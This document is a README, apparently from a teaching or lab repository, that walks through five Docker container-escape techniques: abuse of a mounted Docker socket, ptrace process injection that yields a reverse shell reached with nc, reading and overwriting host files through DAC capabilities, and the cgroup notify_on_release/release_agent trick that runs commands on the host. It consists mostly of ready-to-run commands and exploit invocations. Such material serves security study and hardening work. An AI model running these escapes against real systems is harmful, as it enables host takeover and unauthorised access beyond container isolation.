# Container Escape example

## Use mounted Docker Socket

1. Build the image with `docker build --tag=escape_1 1_docker_socket`
2. Run the container with `docker run -it --cap-drop=ALL -v /var/run/docker.sock:/run/docker.sock escape_1 bash`
3. Inside the container run `docker run -it --privileged -v /:/host/ ubuntu bash -c "chroot /host/"`

## Process Injection

1. Build the image with `docker build --tag=escape_2 2_process_injection`
2. Run a test python webserver with `/usr/bin/python3 -m http.server 8080`
3. Run the container with `docker run -it --pid=host --cap-drop=ALL --cap-add=SYS_PTRACE --security-opt apparmor=unconfined escape_2 bash`
4. Inside the container run `ps -eaf | grep "/usr/bin/python3 -m http.server 8080" | head -n 1`
5. Get the PID of the webserer end run `./inject <PID>`
6. If all is well you have a reverse shell waiting on port 8080, connect with `nc <HOST-IP> 5600`

## Reading files from host

1. Build the image with `docker build --tag=escape_3 3_read_host_files`
2. Run the container with `docker run -it --cap-drop=ALL --cap-add=DAC_READ_SEARCH escape_3 bash`
3. Inside the container run `./shocker <PATH-TO-HOST-FILE> <DESTINATION-FILE>`

## Host file overwrite

1. Build the image with `docker build --tag=escape_4 4_host_file_overwrite`
2. Run the container with `docker run -it --cap-drop=ALL --cap-add=DAC_OVERRIDE --cap-add=DAC_READ_SEARCH --cap-add=CHOWN escape_4 bash`
3. Inside the container run `./read <PATH-TO-HOST-FILE> <DESTINATION-FILE>` to read file from host
4. Inside the container run `./write <PATH-TO-HOST-FILE> <SOURCE-FILE>` to write a file from container to host

## Abusing notify on release

1. Run the container with `docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash`
2. Inside the container run

```
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
# command to run in the host
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
